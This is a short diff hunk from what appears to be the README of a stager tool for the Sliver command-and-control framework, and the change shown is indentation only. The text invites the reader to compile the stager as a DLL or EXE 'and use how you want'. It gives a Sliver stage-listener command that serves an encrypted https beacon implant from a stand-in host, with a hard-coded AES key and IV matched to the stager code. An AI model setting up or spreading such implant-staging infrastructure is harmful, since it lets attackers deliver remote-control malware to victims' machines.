@@ -7,7 +7,7 @@ Compile as DLL or EXE and use how you want.
 
 On sliver server enter:
 
-  sliver > stage-listener -p https_beacon -u http://example.com:8080 --aes-encrypt-key 'D(G+KbPeShVmYq3t6v9y$B&E)H@McQfF' --aes-encrypt-iv '8y/B?E(G+KbPeShP'
+    sliver > stage-listener -p https_beacon -u http://example.com:8080 --aes-encrypt-key 'D(G+KbPeShVmYq3t6v9y$B&E)H@McQfF' --aes-encrypt-iv '8y/B?E(G+KbPeShP'
 
 The encryption details must match inside of Program.cs. 
 
